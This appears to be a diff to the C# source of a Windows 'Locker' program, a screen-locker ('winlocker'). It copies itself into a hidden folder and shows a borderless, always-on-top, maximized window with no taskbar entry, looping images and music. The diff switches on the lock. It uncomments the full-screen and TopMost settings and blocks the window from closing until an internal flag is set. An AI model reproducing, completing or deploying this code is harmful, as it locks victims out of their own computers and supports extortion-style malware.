@@ -1,86 +1,76 @@
 ﻿using System;
-using System.Diagnostics;
 using System.IO;
 using System.Media;
 using System.Windows.Forms;
 using System.Threading;
-
 namespace Locker
 {
     public partial class Form1 : Form
     {
-        private void Pause(int value)
-        {
-            Stopwatch sw = new Stopwatch();
-            sw.Start();
-            while (sw.ElapsedMilliseconds < value)
-                Application.DoEvents();
-        }
         private void LockIn()
         {
             for (j = 0; j <= 2; j++)
             {
                 this.BackgroundImage = Properties.Resources.pic1;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic2;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic3;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic4;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic5;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic6;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic23;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic8;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic9;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic10;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic11;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic22;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic13;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic14;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic15;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic16;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic17;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic18;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic19;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic20;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic21;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic12;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic7;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic24;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 this.BackgroundImage = Properties.Resources.pic25;
-                Thread.Sleep(1000);
+                Thread.Sleep(250);
                 j--;
             }
         }
-
         SoundPlayer Sound;
+        Thread locker_thread;
         int i = 0, k = 0, j;
         public Form1()
         {
             InitializeComponent();
             Sound = new SoundPlayer(Properties.Resources.Music);
-
             #region defining
             //Создание копии в скрытой папке
             string targetPath = @"C:\Users\CheAnime\";
@@ -108,8 +98,8 @@ namespace Locker
             this.MaximizeBox = false;
             this.MinimizeBox = false;
             this.ControlBox = false;
-            //this.WindowState = FormWindowState.Maximized;
-            //this.TopMost = true;
+            this.WindowState = FormWindowState.Maximized;
+            this.TopMost = true;
             this.ShowInTaskbar = false;
             this.FormBorderStyle = FormBorderStyle.None;
             this.Move += delegate { this.Capture = false; };
@@ -118,7 +108,6 @@ namespace Locker
             Thread locker_thread = new Thread(LockIn);
             locker_thread.Start();
         }
-
         private void Form1_Load(object sender, EventArgs e)
         {
             //Создание копии в скрытой папке
@@ -147,8 +136,8 @@ namespace Locker
             this.MaximizeBox = false;
             this.MinimizeBox = false;
             this.ControlBox = false;
-            //this.WindowState = FormWindowState.Maximized;
-            //this.TopMost = true;
+            this.WindowState = FormWindowState.Maximized;
+            this.TopMost = true;
             this.ShowInTaskbar = false;
             this.FormBorderStyle = FormBorderStyle.None;
             this.Move += delegate { this.Capture = false; };
@@ -156,11 +145,12 @@ namespace Locker
         }
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-            //if (k == 0) e.Cancel = true;
+            if (k == 0) e.Cancel = true;
         }
         private void Form1_FormClosed(object sender, FormClosedEventArgs e)
         {
-            //Sound.Stop();
+            Sound.Stop();
+            Environment.Exit(0);
         }
         private void textBox1_TextChanged(object sender, EventArgs e)
         {
